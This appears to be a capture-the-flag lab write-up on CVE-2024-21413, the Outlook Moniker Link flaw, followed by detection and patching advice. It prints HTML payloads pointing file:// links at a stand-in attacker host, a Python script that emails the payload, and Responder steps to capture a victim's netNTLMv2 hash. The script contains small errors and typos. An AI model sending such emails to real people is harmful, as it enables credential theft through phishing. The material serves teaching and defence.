Outlook can render emails as HTML. You may notice this being used by your favorite newsletters. Additionally, Outlook can parse hyperlinks such as HTTP and HTTPs. However, it can also open URLs specifying applications known as [Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers). Normally, outlook will prompt a security warning when external applications are triggered. 

This pop-up is a result of Outlook's "Protected View". Protected View opens emails containing attachments, hyperlinks and similar content in *read-only mode*, blocking things such as macros (especially from outside the organization).

By using the `file://` Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (`<a href="file://ATTACKER_IP>/test>Click me</a>`). The SMB protocol is used, which involves using local credentials for authentication. However Outlook's protected view catches and blocks this attempt.

```html
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
```

The vulnerability here exists by modifying our hyperlink to include the `!` special character and some text in our Moniker Link which results in bypassing Outlook's Protected View. For example: `<a href="file://ATTACKER_IP/test!exploit>Click me</a>`.

```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

We, as attackers, can provide a Moniker Link of this nature for the attack. Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

Remote Code Execution (RCE) is possible because Moniker Links use the **Component Object Model** on Windows. However, explaining this is currently out of the scope of this room, as there is no publicly released proof of concept for achieving RCE via this specific CVE.
# Exploitation

For this attack, we will email our victim a Moniker Link similar to the one provided in the previous task. The objective, as the attacker, is to craft an email to the victim with a Moniker Link that bypasses Outlook's "Protected View", where the victim's client will attempt to load a file from our attacking machine, resulting in the victim's netNTLMv2 hash being captured.

But first, let's run through a PoC I have created (which is also available via [GitHub](https://github.com/CMNatic/CVE-2024-21413))

```python
import smtplib
from email.mine.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with sender email address
reciever_email = 'victim@monikerlink.thm' # Replace with recipient email address
password = input("Enter your email address and password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
	<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

	</body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["FROM"] formataddr(('CMNatic', sender_email))
message["To"] = reciever_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
	server.login(sender_email, password)
except Exception as err:
	print(err)
	exit(-1)

try:
	server.sendmail(sender_email, [receiver_email], message.as_string())
	print("\n Email delivered")
except Exception as error:
	print(error)
finally:
	server.quit()
```

The PoC:

- Takes an attacker victim & email. Normally, you would need to use your own SMTP server (this has been provided in this room).
- Requires the password to authenticate. For this room, the password for **attacker@monikerlink(.)thm** is **attacker**.
- Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink.
- Then, fill in the "subject", "from", and "to" fields in the email. 
- Finally, it sends the email to the mail server.

Let's use `Responder` to create an SMB listener on our attacking machine. For the THM AttackBox, the interface will be `-I ens5`. The interface name will differ if you are using your own device (i.e. Kali). If you would like some homework, an Impacket server can also be used. 

```shell-session
root@attackbox:# responder -I ens5
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

```

Open Outlook by clicking the "Outlook" shortcut on the desktop. When Outlook has opened, click "I don't want to sign in or create an account" on the popup.

Dismiss the second popup by clicking the "X" at the top right of the popup (you may need to drag the window to the left a little, depending on screen resolution).

When completed, you will see the Outlook interface. For this room, the victim's mailbox has already been set up in Outlook for you.

Return to the AttackBox. We will copy and paste the PoC above onto the AttackBox. For this, we will create a new file on the AttackBox. `nano exploit.py` and use the slide-out tray in the split-screen view. 

We will need to do some initial setup on our AttackBox before running the Python script:

- Modify the Moniker Link (line 12) in our PoC to reflect the IP address of our AttackBox.
- Replace the MAILSERVER placeholder on line #31 with `<IP>`.

When done, we can run the exploit. When prompted for the attacker's email and password, enter "attacker".

```shell-session
root@attackbox:# python3 exploit.py
Enter your attacker email password: attacker
```

The Python script will print "`Email Delivered`" when the email has been sent. If the script complains about authentication failure, ensure you have correctly replaced the values in `exploit.py`. Now, let's return to the vulnerable machine and check for new email:

Click on "Click Me" in the email hyperlink and return to our responder terminal session on the AttackBox:

Success! We have successfully captured the netNTLMv2 hash.
# Detection

A [Yara rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar) has been created by [Florian Roth](https://twitter.com/cyb3rops/status/1758792873254744344) to detect emails containing the `file:\\` element in the Moniker Link.

Additionally, the SMB request from the victim and client can be seen in a packet capture with a truncated netNTLMv2 hash.

# Remediation

Microsoft has included patches to resolve this vulnerability in February's "patch Tuesday" release. You can see a list of KB articles by Office build [here](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413). Updating Office through Windows Update or the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Home.aspx) is strongly recommended.

Additionally, in the meantime, it is a timely reminder to practice general -safe- cybersecurity practices.
	For example, reminding users to:
	- Do not click on random links
	- Preview links before clicking them
	- Forward suspicious emails to the respective department responsible for cybersecurity

Since this vulnerability bypasses Outlook's Protected View, there is no way to reconfigure Outlook to prevent this attack. Additionally, preventing the SMB protocol entirely may do more harm than good, especially as it is essential for accessing network shares. However, you may be able to block this at the firewall level, depending on the organization.
